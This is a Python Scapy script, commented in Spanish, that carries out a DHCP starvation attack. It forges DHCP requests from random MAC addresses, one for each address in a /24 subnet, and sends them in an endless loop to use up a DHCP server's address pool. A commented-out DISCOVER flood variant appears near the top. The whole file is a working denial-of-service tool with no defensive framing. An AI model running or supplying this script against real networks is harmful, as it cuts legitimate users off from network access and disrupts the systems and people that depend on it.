from scapy.all import *
import sys
import os
#conf.checkIPaddr = False
#SOLO SIRVE CON ROUTER CISCO
#a = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = RandMAC())
#b = IP(src = '0.0.0.0', dst = '255.255.255.255')
#c = UDP(sport = 68, dport = 67)
#d = BOOTP(op = 1, chaddr = RandMAC())
#e = DHCP(options = [('message-type', 'discover'), ('end')])

#dhcp_discover = a/b/c/d/e

#sendp(dhcp_discover, loop = 1)
#a = dhcp_request()
#a.show2()
#sendp(a, loop=1)
def GenerarMacUnicast():
	MAC = str(RandMAC())
	MAC=list(MAC)
	par = ['0','2','4', '6', '8', 'a', 'c', 'e']	
	j = random.randint(0,len(par)-1)	
	MAC[1]=par[j]			
	MAC= "".join(MAC)	
	return MAC

#Referencia
#https://github.com/shreyasdamle/DHCP-Starvation-
#https://github.com/AlejandroSalinasV/DHCP-Starvation-/blob/master/dhcp_starvation.py
def dhcp_starvation():
	packet_list = [] 
	for ip in range (1,255):		
		bogus_mac_address = GenerarMacUnicast()
		dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=bogus_mac_address)/DHCP(options=[("message-type","request"),("server_id","192.168.1.2"),("requested_addr", IP_address_subnet + str(ip)),"end"])
		packet_list.append(dhcp_request)
		#sendp(dhcp_request)
		#print "Requesting: " + IP_address_subnet + str(ip) + "\n"
	return packet_list
			

layer2_broadcast = "ff:ff:ff:ff:ff:ff"
conf.checkIPaddr = False #To stop scapy from checking return packet originating from any packet that we have sent out    
IP_address_subnet = "192.168.1."
  

                
paquete = dhcp_starvation()
sendp(paquete, loop = True);
